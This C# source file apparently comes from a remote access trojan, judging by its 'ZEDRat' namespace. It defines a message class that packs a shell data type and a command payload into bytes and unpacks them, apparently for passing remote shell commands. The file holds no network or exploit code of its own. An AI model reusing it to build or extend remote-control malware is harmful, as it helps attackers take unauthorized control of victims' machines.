using System.IO;

namespace ZEDRatApp.ZEDRAT.Messages
{
	public class RemoteHydraRT_Messages
	{
		public string _ShellDataType;

		public byte[] _Payload;

		public RemoteHydraRT_Messages()
		{
		}

		public RemoteHydraRT_Messages(string ShellDataType, byte[] Command)
		{
			this._ShellDataType = ShellDataType;
			this._Payload = Command;
		}

		public static byte[] ClassToByte(object ob)
		{
			RemoteHydraRT_Messages remoteHydraRT_Messages = (RemoteHydraRT_Messages)ob;
			using MemoryStream memoryStream = new MemoryStream();
			using BinaryWriter binaryWriter = new BinaryWriter(memoryStream);
			binaryWriter.Write(remoteHydraRT_Messages._ShellDataType);
			binaryWriter.Write((uint)remoteHydraRT_Messages._Payload.Length);
			binaryWriter.Write(remoteHydraRT_Messages._Payload);
			return memoryStream.ToArray();
		}

		public static RemoteHydraRT_Messages ByteToClass(byte[] b)
		{
			RemoteHydraRT_Messages remoteHydraRT_Messages = new RemoteHydraRT_Messages();
			using MemoryStream input = new MemoryStream(b);
			using BinaryReader binaryReader = new BinaryReader(input);
			remoteHydraRT_Messages._ShellDataType = binaryReader.ReadString();
			remoteHydraRT_Messages._Payload = binaryReader.ReadBytes((int)binaryReader.ReadUInt32());
			return remoteHydraRT_Messages;
		}
	}
}
